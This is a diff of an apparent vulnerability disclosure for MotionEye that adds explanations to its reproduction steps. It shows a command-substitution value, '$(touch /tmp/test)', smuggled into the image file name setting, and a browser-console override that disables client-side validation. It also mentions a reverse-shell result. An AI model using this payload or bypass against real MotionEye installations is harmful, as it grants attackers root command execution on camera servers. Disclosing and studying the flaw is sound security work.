@@ -23,7 +23,8 @@ During security testing of a MotionEye instance running in Docker, it was observ
 
 ## Steps to Reproduce
 
-### 1. Container Setup
+### 1. Container Setup    
+Run the following command to initiate the Docker image download and start the container    
 ```bash
 docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
 ```
@@ -38,7 +39,9 @@ docker logs motioneye | grep "motionEye server"
 <img width="741" height="168" alt="image" src="https://github.com/user-attachments/assets/1b14e8d4-d6d9-4f0c-8465-5b806eaab83f" />
 
 
-### 3. File System Access
+### 3. File System Access    
+Once the Docker container is running, the container shell can be accessed using the following commands    
+
 ```bash
 docker exec -it motioneye /bin/bash
 ls -la /tmp
@@ -56,18 +59,21 @@ Added sample RTSP network camera.
 <img width="1623" height="869" alt="image" src="https://github.com/user-attachments/assets/dcef8d97-062e-408d-bcda-cdd3fd304324" />
 
 
-### 6. Injection Attempt
+### 6. Injection Attempt    
+A malicious execution command was entered into the “Still Images” > “Image File Name” ,  but a client-side validation error was encountered.    
 ```bash
 $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
 ```
-Blocked by client-side validation.
+Blocked by client-side validation.    
 <img width="739" height="104" alt="image" src="https://github.com/user-attachments/assets/0cadf3c1-fa84-4719-9ef8-e60a62ccec6b" />
 
 <img width="611" height="90" alt="image" src="https://github.com/user-attachments/assets/0a2ce196-6513-4246-ae0c-0d2472d0fc89" />
 
 
 
-### 7. Client-Side Validation Discovery
+### 7. Client-Side Validation Discovery    
+The following script is responsible for the validation: /static/js/main.js?v=0.43.1b4, which references /static/js/ui.js?v=0.43.1b4 to implement the validation conditions.    
+
 File: `/static/js/main.js?v=0.43.1b4` referencing `/static/js/ui.js?v=0.43.1b4`  
 ```javascript
 function configUiValid() {
@@ -80,7 +86,9 @@ function configUiValid() {
 }
 ```
 
-### 8. Bypass Technique
+### 8. Bypass Technique    
+By overriding the **configUiValid** function in the browser console, all validation checks can be bypassed: Enter below snippet in console of the browser (F12 or Ctrl+Shift+I)    
+
 ```javascript
 configUiValid = function() { 
     return true; 
@@ -89,7 +97,9 @@ configUiValid = function() {
 <img width="819" height="539" alt="image" src="https://github.com/user-attachments/assets/5256c74d-daf4-4595-bd91-69989f43c5c3" />
 
 
-### 9. Payload Execution
+### 9. Payload Execution    
+Now payload can be directly entered without any validation: set as below and Apply the settings    
+
 Settings:  
 - Capture mode = Interval Snapshots  
 - Interval = 10  
@@ -106,7 +116,9 @@ Applied → File created with **root permissions**.
 
 ---
 
-## Impact: Weaponizing RCE
+## Impact: Weaponizing RCE    
+simple reverse shell production:    
+
 
 Listener:
 ```bash
@@ -127,7 +139,9 @@ Result: Remote shell obtained.
 
 ---
 
-## Root Cause & Flow
+## Root Cause & Flow    
+MotionEye is vulnerable because it takes user input from the web dashboard and writes it straight into the Motion config files without checking for dangerous characters. For example, the field image_file_name in the UI is sent to the backend (config.py) and saved into /etc/motioneye/camera-<id>.conf. When MotionEye restarts the Motion service (motionctl.start), the Motion process reads this config file. If the picture_filename field contains shell syntax like $(touch /tmp/test), Motion will run it as a real command instead of treating it as part of the filename.    
+
 Unsanitized input written into Motion config files:  
 `Dashboard JS → ConfigHandler.set_config() → camera-1.conf → motionctl.restart() → motion parses picture_filename → executes payload`
 
